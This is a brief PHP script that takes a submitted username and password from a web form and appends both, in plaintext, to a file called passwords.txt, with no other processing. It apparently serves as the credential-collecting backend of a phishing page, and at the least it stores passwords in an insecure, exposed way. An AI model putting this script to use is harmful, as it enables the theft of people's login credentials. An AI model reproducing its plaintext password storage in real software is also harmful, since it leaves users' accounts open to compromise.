<?php
$name = $_POST['user_name'];
$pass =  $_POST['pass_word'];
$myfile = fopen("passwords.txt", "a") or die("Unable to open file!");
$txt = "username: " . $name . "\n";
$txt .= "password: " . $pass. " \n";
fwrite($myfile, $txt);
fclose($myfile);
?>